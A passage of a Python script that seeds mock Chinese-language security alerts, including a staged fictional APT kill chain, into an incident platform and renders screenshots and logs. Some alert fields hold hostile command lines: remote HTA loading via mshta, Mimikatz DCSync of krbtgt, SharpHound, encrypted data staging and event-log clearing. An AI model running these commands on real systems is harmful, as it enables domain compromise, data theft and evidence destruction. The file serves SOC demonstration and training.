        "alert_type": "凭证访问 / Password Spraying", "severity": "high", "status": "pending",
        "reporter": "soc_zhangwei", "owner": "", "occurred_at": t(-1, 0, 47),
        "hostname": "AD-DC-01", "username": "（多账号）",
        "source_ip": "45.146.19.77", "domain": "corp.local",
        "rule_id": "SIEM-AUTH-5044", "rule_name": "单源对多账号低频尝试（喷洒）",
        "mitre": "T1110.003 Password Spraying",
        "description": "AD 域控 AD-DC-01 的安全日志（EventID 4625/4740）显示，来源 45.146.19.77 在 1 小时内对 320 个域账号各尝试 2-3 个常见弱口令，造成 27 个账号被锁定，呈典型密码喷洒特征。该源 IP 与 C2 告警一致。",
        "key_evidence": "单源对 320 账号低频尝试；27 账号锁定；源 IP 45.146.19.77 与 C2 同源",
        "handling_suggestion": "封禁源 IP，重置被命中账号口令，强化锁定策略与 MFA，排查是否有账号被成功爆破。",
    },
    {
        "title": "MFA 疲劳轰炸后用户误批准登录",
        "source_system": "Microsoft Sentinel", "source_product": "Azure Sentinel",
        "alert_type": "凭证滥用 / MFA Fatigue", "severity": "medium", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_lina", "occurred_at": t(0, 1, 19),
        "hostname": "O365 / AzureAD", "username": "CORP\\zhao.lei",
        "source_ip": "185.220.101.45", "domain": "login.microsoftonline.com",
        "rule_id": "SIEM-AUTH-5061", "rule_name": "短时间多次 MFA 推送后批准",
        "mitre": "T1621 Multi-Factor Authentication Request Generation",
        "description": "账号 zhao.lei 在 02:00 前后 10 分钟内收到 22 次 MFA 推送请求（来源 185.220.101.45），最终一次被批准并成功登录，疑似攻击者已掌握口令并通过 MFA 疲劳轰炸诱导用户批准。",
        "key_evidence": "10 分钟 22 次 MFA 推送后批准；源 IP 185.220.101.45；非常规登录时段",
        "handling_suggestion": "撤销会话与令牌、重置口令，切换为号码匹配 MFA，提醒用户勿随意批准推送。",
    },
    {
        "title": "VPN 接入触发异地登录（确认为员工出差）",
        "source_system": "Microsoft Sentinel", "source_product": "Azure Sentinel",
        "alert_type": "凭证滥用 / Valid Accounts", "severity": "low", "status": "closed", "conclusion": "false_positive",
        "reporter": "soc_liyang", "owner": "", "occurred_at": t(-2, 9, 5),
        "hostname": "VPN-GW", "username": "CORP\\sun.wei",
        "source_ip": "116.226.78.10", "domain": "vpn.corp.com",
        "rule_id": "SIEM-AUTH-5012", "rule_name": "Impossible Travel 不可能旅行",
        "description": "账号 sun.wei 从上海与北京先后登录触发异地告警。核实为员工出差期间先连公司 VPN（出口在上海）后到达北京现场办公，且全程使用公司管理设备并通过 MFA，属正常情况。",
        "key_evidence": "登录均通过公司 VPN 与受管设备；MFA 正常；已与本人/HR 确认出差行程",
        "handling_suggestion": "确认为出差正常登录，标记误报，可对 VPN 出口 IP 段做地理白名单优化。",
    },
]

OTHER = [
    {
        "title": "钓鱼邮件携带恶意宏附件（邮件网关拦截）",
        "source_system": "Proofpoint 邮件网关", "source_product": "Proofpoint TAP",
        "alert_type": "初始访问 / Phishing", "severity": "medium", "status": "pending",
        "reporter": "soc_liyang", "owner": "", "occurred_at": t(0, 8, 2),
        "username": "wang.fang@corp.com", "domain": "invoice-2026.top",
        "file_hash": "d41d8cd98f00b204e9800998ecf8427e7a1b2c3d4e5f60718293a4b5c6d7e8f9",
        "source_ip": "192.0.2.77", "rule_id": "MAIL-PHISH-7701", "rule_name": "含宏 Office 附件 + 仿冒发件人",
        "mitre": "T1566.001 Spearphishing Attachment",
        "description": "邮件网关拦截一封发往 wang.fang@corp.com 的钓鱼邮件，伪装为「2026 年度发票」，附件 invoice.xlsm 含自动执行宏，回连 invoice-2026.top。与 HR-PC-118 的 PowerShell C2 告警疑为同一投递活动。",
        "key_evidence": "xlsm 恶意宏附件；仿冒发票主题；回连 invoice-2026.top；收件人为 C2 告警主机用户",
        "handling_suggestion": "全域检索同源邮件并清除，封禁发件域与回连域，对收件人主机做应急排查。",
    },
    {
        "title": "敏感主机接入未授权 USB 存储设备",
        "source_system": "终端管控平台 DLP", "source_product": "Endpoint DLP",
        "alert_type": "数据渗出 / Hardware Additions", "severity": "medium", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(-1, 18, 26),
        "hostname": "FIN-DB-03", "username": "CORP\\db.admin",
        "rule_id": "DLP-USB-8810", "rule_name": "敏感区主机接入未登记 USB",
        "mitre": "T1052.001 Exfiltration over USB",
        "description": "财务数据库主机 FIN-DB-03 检测到接入一个未登记的 USB 大容量存储设备（SN: 070B1A2C），随后有 1.2GB 文件被复制到该设备。该主机处于禁止外设的敏感区，违反数据安全策略。",
        "key_evidence": "未登记 USB（SN 070B1A2C）；复制 1.2GB 文件外带；主机位于禁用外设的敏感区",
        "handling_suggestion": "联系责任人核实用途，封禁该主机 USB 存储权限，审计复制文件是否含敏感数据。",
    },
    {
        "title": "云存储桶配置错误导致公网可读",
        "source_system": "云安全态势管理 CSPM", "source_product": "Cloud CSPM",
        "alert_type": "配置缺陷 / Cloud Misconfiguration", "severity": "high", "status": "investigating",
        "reporter": "soc_zhangwei", "owner": "cloud_team", "occurred_at": t(-1, 11, 40),
        "domain": "corp-data-prod.oss-cn-hangzhou.aliyuncs.com",
        "url": "https://corp-data-prod.oss-cn-hangzhou.aliyuncs.com/",
        "rule_id": "CSPM-EXP-9120", "rule_name": "对象存储桶 ACL 公网可读",
        "mitre": "T1530 Data from Cloud Storage Object",
        "description": "CSPM 扫描发现生产 OSS 桶 corp-data-prod 的 ACL 被设置为 public-read，桶内包含数据库备份与客户资料，任何人可匿名列举/下载，存在重大数据泄露风险。变更来源为一次手工配置。",
        "key_evidence": "OSS 桶 ACL=public-read；含 DB 备份与客户资料；可匿名列举下载",
        "handling_suggestion": "立即将桶 ACL 改为私有，核查访问日志确认是否已被下载，启用桶策略与访问告警。",
    },
]

# ============================================================
# APT 多阶段攻击剧本「夜莺行动 / Operation NIGHTINGALE」
# 单条攻击链，跨设备类型，共享 IOC 与时间线，用于演示杀伤链还原。
# 共享 IOC：FIN-PC-22(10.22.4.22) / chen.jing / telemetry-sync.net /
#           91.219.236.18 / AD-DC-02(10.10.0.2) / FIN-DB-01(10.30.1.10)
# ============================================================
APT_TAG = "【夜莺行动】"
APT_CAMPAIGN = [
    {   # 阶段 1 · 初始访问
        "source_category": "other", "source_system": "Proofpoint 邮件网关", "source_product": "Proofpoint TAP",
        "title": APT_TAG + "阶段1 定向钓鱼：伪装猎头 Offer 诱导点击",
        "alert_type": "初始访问 / Spearphishing Link", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-6, 9, 12),
        "username": "chen.jing@corp.com", "domain": "hr-recruit2026.com", "source_ip": "91.219.236.18",
        "url": "https://hr-recruit2026.com/offer/view?id=chen.jing",
        "rule_id": "MAIL-PHISH-7720", "rule_name": "仿冒猎头主题 + 新注册域名链接",
        "mitre": "T1566.002 Spearphishing Link",
        "description": "财务部 chen.jing 收到伪装为知名猎头的「高薪 Offer」邮件，正文链接指向新注册域名 hr-recruit2026.com（注册商隐私保护、注册仅 6 天），点击后跳转至 telemetry-sync.net 下载载荷。为「夜莺行动」攻击链起点。",
        "key_evidence": "新注册域名 hr-recruit2026.com；猎头钓鱼主题；跳转 telemetry-sync.net；收件人 chen.jing",
        "handling_suggestion": "全域召回同源邮件、封禁发件与跳转域名，对 chen.jing 终端 FIN-PC-22 立即应急排查。",
    },
    {   # 阶段 2 · 执行
        "source_category": "edr", "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "title": APT_TAG + "阶段2 mshta 加载远程 HTA 载荷",
        "alert_type": "执行 / Mshta", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-6, 9, 18),
        "hostname": "FIN-PC-22", "username": "CORP\\chen.jing", "process_name": "mshta.exe",
        "command_line": "mshta.exe https://telemetry-sync.net/u/loader.hta",
        "source_ip": "10.22.4.22", "destination_ip": "91.219.236.18", "destination_port": "443", "domain": "telemetry-sync.net",
        "file_hash": "c1a2b3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
        "rule_id": "EDR-EXEC-1220", "rule_name": "chrome 派生 mshta 加载远程 HTA",
        "mitre": "T1218.005 Mshta", "parent_process": "chrome.exe",
        "description": "chen.jing 点击钓鱼链接后，chrome.exe 派生 mshta.exe 从 telemetry-sync.net 加载远程 loader.hta，落地内存型加载器并向 91.219.236.18 建立首个回连。攻击者获得 FIN-PC-22 初始立足点。",
        "key_evidence": "chrome->mshta 进程链；远程 loader.hta；外联 91.219.236.18:443；紧随钓鱼点击",
        "handling_suggestion": "隔离 FIN-PC-22，封禁 telemetry-sync.net，提取 HTA 研判加载器与后续载荷。",
    },
    {   # 阶段 3 · C2 信标
        "source_category": "ndr", "source_system": "科来 NDR", "source_product": "Colasoft NDR Probe",
        "title": APT_TAG + "阶段3 周期性 HTTPS 信标外联（JA3 命中）",
        "alert_type": "命令与控制 / Beaconing", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_chenhao", "owner": "ir_lina", "occurred_at": t(-6, 10, 2),
        "source_ip": "10.22.4.22", "source_port": "52880", "destination_ip": "91.219.236.18", "destination_port": "443",
        "protocol": "TCP/TLS", "domain": "telemetry-sync.net", "url": "https://telemetry-sync.net/api/v1/poll",
        "rule_id": "NDR-C2-3140", "rule_name": "固定间隔信标 + 恶意 JA3 指纹",
        "mitre": "T1071.001 Web Protocols",
        "description": "探针发现 FIN-PC-22 每 60 秒（±10% 抖动）向 telemetry-sync.net 发起短 HTTPS 请求，TLS 客户端 JA3 指纹命中已知 C2 框架，载荷长度规律，典型 Beacon 心跳。",
        "key_evidence": "60s±抖动周期信标；JA3 命中已知 C2；目标 telemetry-sync.net/91.219.236.18",
        "handling_suggestion": "DNS/IP 双向封禁，提取 Beacon 配置研判 C2 框架与 sleep/jitter，关联终端进程。",
    },
    {   # 阶段 4 · 持久化
        "source_category": "edr", "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "title": APT_TAG + "阶段4 WMI 事件订阅持久化",
        "alert_type": "持久化 / WMI Event Subscription", "severity": "medium", "status": "investigating", "conclusion": "unknown",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(-5, 22, 41),
        "hostname": "FIN-PC-22", "username": "CORP\\chen.jing", "process_name": "powershell.exe",
        "command_line": 'powershell -nop -c "$f=Set-WmiInstance __EventFilter ...; Set-WmiInstance CommandLineEventConsumer ..."',
        "source_ip": "10.22.4.22", "rule_id": "EDR-PERSIST-1560", "rule_name": "WMI __EventFilter + CommandLineEventConsumer 创建",
        "mitre": "T1546.003 WMI Event Subscription", "parent_process": "mshta.exe",
        "description": "FIN-PC-22 上通过 PowerShell 创建 WMI 永久事件订阅（__EventFilter 绑定 CommandLineEventConsumer），在系统启动后自动拉起 C2 加载器，实现无文件持久化。",
        "key_evidence": "WMI 永久事件订阅；CommandLineEventConsumer 指向加载器；父进程 mshta",
        "handling_suggestion": "删除恶意 WMI 订阅（Get-WmiObject __EventFilter/__EventConsumer），全网排查同类持久化。",
    },
    {   # 阶段 5 · 探测
        "source_category": "edr", "source_system": "奇安信 天擎 EDR", "source_product": "QAX TianQing EDR 6.8",
        "title": APT_TAG + "阶段5 域内侦察（SharpHound 采集）",
        "alert_type": "侦察 / Domain Discovery", "severity": "medium", "status": "investigating", "conclusion": "unknown",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(-5, 23, 14),
        "hostname": "FIN-PC-22", "username": "CORP\\chen.jing", "process_name": "SharpHound.exe",
        "command_line": "SharpHound.exe -c All --zipfilename fin.zip",
        "file_path": r"C:\Users\chen.jing\AppData\Local\Temp\SharpHound.exe",
        "file_hash": "2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80910",
        "source_ip": "10.22.4.22", "destination_ip": "10.10.0.2", "rule_id": "EDR-DISC-1410", "rule_name": "BloodHound/SharpHound 域采集",
        "mitre": "T1087.002 / T1482 Domain Trust Discovery", "parent_process": "powershell.exe",
        "description": "FIN-PC-22 运行 SharpHound 对域 corp.local 进行全量采集（用户、组、ACL、会话、信任关系），并向域控 AD-DC-02(10.10.0.2) 发起大量 LDAP 查询，为后续提权与横向规划路径。",
        "key_evidence": "SharpHound -c All；对 AD-DC-02 大量 LDAP；生成 fin.zip 采集结果",
        "handling_suggestion": "保全采集文件，按 BloodHound 视角评估可达路径，重点保护高价值账号与 DA 组。",
    },
    {   # 阶段 6 · 凭证访问 DCSync
        "source_category": "edr", "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "title": APT_TAG + "阶段6 DCSync 导出域哈希（含 krbtgt）",
        "alert_type": "凭证访问 / DCSync", "severity": "critical", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-4, 1, 6),
        "hostname": "FIN-PC-22", "username": "CORP\\chen.jing", "process_name": "powershell.exe",
        "command_line": 'powershell -c "Invoke-Mimikatz -Command \'lsadump::dcsync /domain:corp.local /user:krbtgt\'"',
        "source_ip": "10.22.4.22", "destination_ip": "10.10.0.2", "rule_id": "EDR-CRED-1010", "rule_name": "非域控发起 DRSUAPI 复制（DCSync）",
        "mitre": "T1003.006 DCSync", "parent_process": "mshta.exe",
        "description": "FIN-PC-22 以已提权账号通过 DRSUAPI 向 AD-DC-02 发起目录复制（DCSync），导出包括 krbtgt 在内的全域账号哈希。攻击者已可制作黄金票据，构成域沦陷级风险。",
        "key_evidence": "非域控主机发起 DRSUAPI 复制；目标 user krbtgt；源 FIN-PC-22 -> AD-DC-02",
        "handling_suggestion": "按域沦陷处置：两次重置 krbtgt、强制全域改密、排查黄金票据，隔离 FIN-PC-22。",
    },
    {   # 阶段 7 · 横向移动
        "source_category": "siem", "source_system": "Splunk Enterprise Security", "source_product": "Splunk ES",
        "title": APT_TAG + "阶段7 WinRM 横向移动至财务数据库",
        "alert_type": "横向移动 / WinRM", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(-3, 2, 28),
        "hostname": "FIN-DB-01", "username": "CORP\\svc_sql", "source_ip": "10.22.4.22", "destination_ip": "10.30.1.10",
        "domain": "corp.local", "rule_id": "SIEM-LAT-5120", "rule_name": "WinRM 5985 远程会话 + 异常源",
        "mitre": "T1021.006 Windows Remote Management",
        "description": "关联日志显示，攻击者使用 DCSync 获取的 svc_sql 凭据，从 FIN-PC-22(10.22.4.22) 经 WinRM(5985) 远程连接至财务数据库 FIN-DB-01(10.30.1.10) 并执行命令。源主机非该服务账号常用登录点。",
        "key_evidence": "svc_sql 经 WinRM 从 FIN-PC-22 登录 FIN-DB-01；账号非常用源；凭据源自 DCSync",
        "handling_suggestion": "重置 svc_sql、隔离 FIN-DB-01，核查数据库访问与导出记录，收敛 WinRM 暴露面。",
    },
    {   # 阶段 8 · 数据收集/打包
        "source_category": "edr", "source_system": "奇安信 天擎 EDR", "source_product": "QAX TianQing EDR 6.8",
        "title": APT_TAG + "阶段8 敏感数据打包加密（7z 暂存）",
        "alert_type": "数据收集 / Archive Collected Data", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-2, 0, 51),
        "hostname": "FIN-DB-01", "username": "CORP\\svc_sql", "process_name": "7z.exe",
        "command_line": r'7z a -t7z -pXy9!q2 -mhe=on C:\Windows\Temp\bak.7z D:\finance\reports\* D:\finance\export\*',
        "file_path": r"C:\Windows\Temp\bak.7z",
        "file_hash": "5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c",
        "source_ip": "10.30.1.10", "rule_id": "EDR-COLL-1310", "rule_name": "命令行打包工具加密暂存大量文件",
        "mitre": "T1560.001 Archive via Utility", "parent_process": "wsmprovhost.exe",
        "description": "FIN-DB-01 上由 WinRM 宿主进程 wsmprovhost.exe 派生 7z.exe，将 D:\\finance 下报表与导出数据加密打包为 C:\\Windows\\Temp\\bak.7z（带密码 + 头加密），为外带做暂存。",
        "key_evidence": "7z 加密打包 D:\\finance 数据；落地 bak.7z；父进程为 WinRM 宿主 wsmprovhost",
        "handling_suggestion": "保全 bak.7z 评估泄露范围，阻断外联，按数据泄露事件升级并通知合规。",
    },
    {   # 阶段 9 · 数据外传
        "source_category": "ndr", "source_system": "科来 NDR", "source_product": "Colasoft NDR Probe",
        "title": APT_TAG + "阶段9 加密数据外传至 C2",
        "alert_type": "数据渗出 / Exfiltration over C2", "severity": "critical", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-1, 1, 37),
        "source_ip": "10.30.1.10", "source_port": "53120", "destination_ip": "91.219.236.18", "destination_port": "443",
        "protocol": "TCP/TLS", "domain": "telemetry-sync.net", "url": "https://telemetry-sync.net/api/v1/upload",
        "rule_id": "NDR-EXFIL-3420", "rule_name": "向 C2 同源地址大流量上行",
        "mitre": "T1041 Exfiltration Over C2 Channel",
        "description": "FIN-DB-01(10.30.1.10) 凌晨向 telemetry-sync.net(91.219.236.18) 上行约 4.2GB 加密流量，目标与前序 C2 信标同源，上传路径 /api/v1/upload，确认为打包数据外带。",
        "key_evidence": "上行 4.2GB 至 telemetry-sync.net；与 C2 信标同源 91.219.236.18；紧随 7z 打包",
        "handling_suggestion": "立即阻断会话与外联，结合 bak.7z 评估外泄数据，按重大数据泄露启动应急与上报。",
    },
    {   # 阶段 10 · 痕迹清除
        "source_category": "edr", "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "title": APT_TAG + "阶段10 清除 Windows 事件日志（反取证）",
        "alert_type": "防御绕过 / Indicator Removal", "severity": "high", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(-1, 2, 5),
        "hostname": "FIN-DB-01", "username": "CORP\\svc_sql", "process_name": "wevtutil.exe",
        "command_line": 'cmd /c "wevtutil cl Security & wevtutil cl System & wevtutil cl Application"',
        "source_ip": "10.30.1.10", "rule_id": "EDR-DEFEVA-1790", "rule_name": "批量清除事件日志",
        "mitre": "T1070.001 Clear Windows Event Logs", "parent_process": "wsmprovhost.exe",
        "description": "数据外传完成后，FIN-DB-01 上执行 wevtutil cl 批量清空 Security/System/Application 事件日志，意图销毁入侵痕迹、对抗取证。为「夜莺行动」收尾动作。",
        "key_evidence": "wevtutil cl Security/System/Application；紧随数据外传；父进程 WinRM 宿主",
        "handling_suggestion": "改用 EDR 遥测与外部日志重建时间线，禁止该主机出网，全量取证镜像后再处置。",
    },
]

CATEGORY_DATA = {
    "edr": EDR, "hids": HIDS, "ndr": NDR, "waf": WAF, "siem": SIEM, "other": OTHER,
}

# 各类型截图字段网格（label, alert_key）
GRID_FIELDS = {
    "edr": [("受影响主机", "hostname"), ("登录用户", "username"), ("主机 IP", "source_ip"),
            ("远端 IP", "destination_ip"), ("父进程", "parent_process"), ("进程名", "process_name"),
            ("规则 ID", "rule_id"), ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at")],
    "hids": [("受影响主机", "hostname"), ("用户", "username"), ("进程", "process_name"),
             ("检测动作", "event_action"), ("源 IP", "source_ip"), ("远端 IP", "destination_ip"),
             ("规则 ID", "rule_id"), ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at")],
    "ndr": [("源 IP", "source_ip"), ("源端口", "source_port"), ("目的 IP", "destination_ip"),
            ("目的端口", "destination_port"), ("协议", "protocol"), ("域名", "domain"),
            ("规则 ID", "rule_id"), ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at")],
    "waf": [("源 IP", "source_ip"), ("站点域名", "domain"), ("站点 IP", "destination_ip"),
            ("HTTP 方法", "http_method"), ("响应状态", "http_status"), ("UA", "user_agent"),
            ("规则 ID", "rule_id"), ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at")],
    "siem": [("主机/系统", "hostname"), ("账号", "username"), ("源 IP", "source_ip"),
             ("域/租户", "domain"), ("文件 Hash", "file_hash"), ("规则 ID", "rule_id"),
             ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at"), ("", "")],
    "other": [("主机/对象", "hostname"), ("账号/收件人", "username"), ("源 IP", "source_ip"),
              ("域名", "domain"), ("文件 Hash", "file_hash"), ("规则 ID", "rule_id"),
              ("检测规则", "rule_name"), ("ATT&CK", "mitre"), ("发生时间", "occurred_at"), ("", "")],
}

HEADER_LABEL = {
    "edr": "EDR 终端检测与响应 · 告警详情",
    "hids": "HIDS 主机入侵检测 · 告警详情",
    "ndr": "NDR 流量探针 · 告警详情",
    "waf": "WAF Web 应用防护 · 告警详情",
    "siem": "SIEM 综合关联告警 · 详情",
    "other": "安全告警 · 详情",
}


# ============================================================
# 截图渲染
# ============================================================
PALETTE = {
    "critical": ("#e5484d", "严重 CRITICAL"), "high": ("#f76808", "高 HIGH"),
    "medium": ("#ffb224", "中 MEDIUM"), "low": ("#46a758", "低 LOW"), "info": ("#5b9dff", "信息 INFO"),
}


def _font(paths, size):
    for p in paths:
        try:
            if p.lower().endswith(".ttc"):
                return ImageFont.truetype(p, size, index=0)
            return ImageFont.truetype(p, size)
        except Exception:
            continue
    return ImageFont.load_default()


def _val(alert, key):
    if not key:
        return ""
    if key == "occurred_at":
        return str(alert.get(key, ""))[:19].replace("T", " ")
    v = alert.get(key)
    return str(v) if v not in (None, "") else "-"


def render_screenshot(category, alert):
    W, H = 1024, 720
    bg, panel, sub, fg, muted, accent = (13, 17, 23), (22, 27, 34), (30, 36, 46), (201, 209, 217), (125, 133, 144), (88, 166, 255)
    cjk = ["C:/Windows/Fonts/msyh.ttc", "C:/Windows/Fonts/simhei.ttf"]
    mono = ["C:/Windows/Fonts/consola.ttf", "C:/Windows/Fonts/cour.ttf"]
    f_title, f_h, f_b, f_s, f_mono, f_badge = _font(cjk, 26), _font(cjk, 16), _font(cjk, 15), _font(cjk, 13), _font(mono, 14), _font(cjk, 14)

    img = Image.new("RGB", (W, H), bg)
    d = ImageDraw.Draw(img)
    sev_color = tuple(int(PALETTE[alert["severity"]][0].lstrip("#")[i:i + 2], 16) for i in (0, 2, 4))
    sev_label = PALETTE[alert["severity"]][1]

    def clip(text, font, max_px):
        text = str(text)
        if d.textlength(text, font=font) <= max_px:
            return text
        while text and d.textlength(text + "…", font=font) > max_px:
            text = text[:-1]
        return text + "…"

    # 顶部栏
    d.rectangle([0, 0, W, 52], fill=panel)
    d.ellipse([18, 19, 34, 35], outline=accent, width=2)
    d.text((46, 14), alert.get("source_system", ""), font=f_h, fill=fg)
    d.text((46, 33), HEADER_LABEL.get(category, "安全告警"), font=f_s, fill=muted)
    d.text((W - 150, 18), "● 实时监控", font=f_s, fill=(70, 167, 88))

    bx0, bx1 = W - 150, W - 30
    d.rounded_rectangle([bx0, 60, bx1, 88], radius=6, fill=sev_color)
    tw = d.textlength(sev_label, font=f_badge)
    d.text(((bx0 + bx1) / 2 - tw / 2, 65), sev_label, font=f_badge, fill=(13, 17, 23))

    d.text((30, 64), "告警标题", font=f_s, fill=muted)
    title = alert["title"]
    d.text((30, 82), title, font=(f_title if d.textlength(title, font=f_title) <= bx0 - 50 else f_h), fill=fg)
    d.line([30, 124, W - 30, 124], fill=sub, width=1)

    # 字段网格
    fields = GRID_FIELDS[category]
    y, colx = 140, [30, 250, 540, 770]
    for i in range(0, 10, 2):
        L1, k1 = fields[i]
        L2, k2 = fields[i + 1]
        if L1:
            d.text((colx[0], y), L1, font=f_s, fill=muted)
            d.text((colx[1], y), clip(_val(alert, k1), f_b, colx[2] - colx[1] - 20), font=f_b, fill=fg)
        if L2:
            d.text((colx[2], y), L2, font=f_s, fill=muted)
            d.text((colx[3], y), clip(_val(alert, k2), f_b, W - 30 - colx[3]), font=f_b, fill=fg)
        y += 30

    # 详情块：命令行 / 请求 / 网络会话
    cmd = alert.get("command_line")
    url = alert.get("url")
    if cmd:
        block_label, block_text, prompt = "进程命令行 / Command Line", cmd, ("PS C:\\> " if alert.get("process_name", "").startswith("power") else "$ ")
    elif url:
        block_label, block_text, prompt = "请求 / Payload", f'{alert.get("http_method","GET")} {url}', "> "
    elif alert.get("domain") or alert.get("destination_ip"):
        block_label = "网络会话 / Session"
        block_text = f'{alert.get("source_ip","?")}:{alert.get("source_port","?")} -> {alert.get("destination_ip","?")}:{alert.get("destination_port","?")}  {alert.get("protocol","")}  {alert.get("domain","")}'
        prompt = "» "
    else:
        block_label, block_text, prompt = "事件摘要", alert.get("description", ""), "» "

    y += 6
    d.text((30, y), block_label, font=f_s, fill=muted)
    y += 22
    cmd_h = 92
    d.rounded_rectangle([30, y, W - 30, y + cmd_h], radius=6, fill=sub)
    d.text((44, y + 10), prompt, font=f_mono, fill=(70, 167, 88))
    line, yy, indent = "", y + 30, 44
    for word in str(block_text).split(" "):
        test = (line + " " + word).strip()
        if d.textlength(test, font=f_mono) > W - 100:
            d.text((indent, yy), line, font=f_mono, fill=(255, 196, 61)); yy += 20; line = word
            if yy > y + cmd_h - 18:
                line = line + " …"; break
        else:
            line = test
    if line:
        d.text((indent, yy), line, font=f_mono, fill=(255, 196, 61))
    y += cmd_h + 14

    # 关键指标行
    for lbl, key in [("文件 Hash (SHA-256)", "file_hash"), ("URL", "url"), ("落地路径", "file_path"), ("User-Agent", "user_agent")]:
        if key == "url" and cmd is None:
            continue  # url 已在详情块展示
        v = alert.get(key)
        if v:
            d.text((30, y), lbl, font=f_s, fill=muted)
            d.text((220, y), clip(v, _font(mono, 13), W - 250), font=_font(mono, 13), fill=(accent if key in ("file_hash", "url") else fg))
            y += 24

    # 检测判定
    y = min(y + 6, H - 96)
    box_fill = (40, 24, 26) if alert["severity"] in ("critical", "high") else panel
    d.rounded_rectangle([30, y, W - 30, y + 84], radius=6, fill=box_fill)
    concl = alert.get("conclusion")
    verdict = {"true_positive": "研判：真实攻击", "false_positive": "研判：告警误报", "business": "研判：正常业务",
               "incident": "研判：安全事件", "unknown": "研判：无法确认"}.get(concl, "检测引擎判定")
    d.text((44, y + 10), verdict, font=f_s, fill=sev_color)
    desc, line, yy = alert.get("description", ""), "", y + 30
    for ch in desc:
        if d.textlength(line + ch, font=f_s) > W - 90:
            d.text((44, yy), line, font=f_s, fill=fg); yy += 19; line = ch
            if yy > y + 70:
                line += "…"; break
        else:
            line += ch
    if line and yy <= y + 70:
        d.text((44, yy), line, font=f_s, fill=fg)

    out = io.BytesIO()
    img.save(out, format="PNG")
    return out.getvalue()


# ============================================================
# 取证日志（按类型适配）
# ============================================================
def render_log(category, alert):
    occ = alert.get("occurred_at", "")[:19].replace("T", " ")
    now = datetime.now(CST).isoformat()[:19].replace("T", " ")
    head = [
        "=" * 78,
        f" {alert.get('source_system')}  取证日志导出",
        f" 导出时间: {now}  时区: Asia/Shanghai (UTC+8)",
        f" 关联规则: {alert.get('rule_id')}  {alert.get('rule_name')}",
        f" ATT&CK: {alert.get('mitre','-')}",
        "=" * 78, "",
    ]
    body = []
    if category in ("edr", "hids", "siem", "other"):
        host = alert.get("hostname", "HOST")
        pid = 4000 + (abs(hash(alert["title"])) % 2000)
        body += [
            f"{occ}  {host}  EventID=1 (ProcessCreate / Auth)",
            f"  Computer: {host}",
            f"  User: {alert.get('username','-')}",
            f"  Image/Process: {alert.get('file_path') or alert.get('process_name','-')}",
            f"  CommandLine: {alert.get('command_line','-')}",
            f"  ParentImage: {alert.get('parent_process','-')}",
            f"  Action: {alert.get('event_action','-')}",
            f"  Hashes: SHA256={alert.get('file_hash','-')}",
            "",
        ]
        if alert.get("destination_ip"):
            body += [
                f"{occ}  {host}  EventID=3 (NetworkConnect)",
                f"  SourceIp: {alert.get('source_ip','-')}  DestinationIp: {alert.get('destination_ip')}:{alert.get('destination_port','-')}",
                f"  DestinationHostname: {alert.get('domain','-')}", "",
            ]
    elif category == "ndr":
        body += [
            f"{occ}  flow  proto={alert.get('protocol','-')}",
            f"  {alert.get('source_ip','-')}:{alert.get('source_port','-')} -> {alert.get('destination_ip','-')}:{alert.get('destination_port','-')}",
            f"  domain/sni: {alert.get('domain','-')}",
            f"  url: {alert.get('url','-')}",
            f"  detection: {alert.get('rule_name')} ({alert.get('rule_id')})", "",
        ]
    elif category == "waf":
        body += [
            f'{occ}  {alert.get("source_ip","-")} -> {alert.get("domain","-")}',
            f'  "{alert.get("http_method","GET")} {alert.get("url","-")}" {alert.get("http_status","-")}',
            f'  User-Agent: {alert.get("user_agent","-")}',
            f'  WAF-Rule: {alert.get("rule_name")} ({alert.get("rule_id")})  Action: {"Block(403)" if str(alert.get("http_status"))=="403" else "Log/Pass"}',
            "",
        ]
    tail = [
        f"VERDICT: {alert.get('conclusion','under_investigation').upper()}",
        f"KeyEvidence: {alert.get('key_evidence','-')}",
        f"Handling: {alert.get('handling_suggestion','-')}", "",
    ]
    return ("\n".join(head + body + tail)).encode("utf-8")


def attach(alert_id, filename, data, mime, description, actor):
    fs = FileStorage(stream=io.BytesIO(data), filename=filename, content_type=mime)
    info, err = incident_service.save_attachment(fs, alert_id=alert_id, description=description, actor=actor)
    if err:
        print(f"    [!] 附件 {filename} 失败: {err}")
    return info


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--no-image", action="store_true", help="不生成截图")
    ap.add_argument("--only", default="", help="仅生成指定类型，逗号分隔，如 edr,waf")
    args = ap.parse_args()

    only = {x.strip() for x in args.only.split(",") if x.strip()}
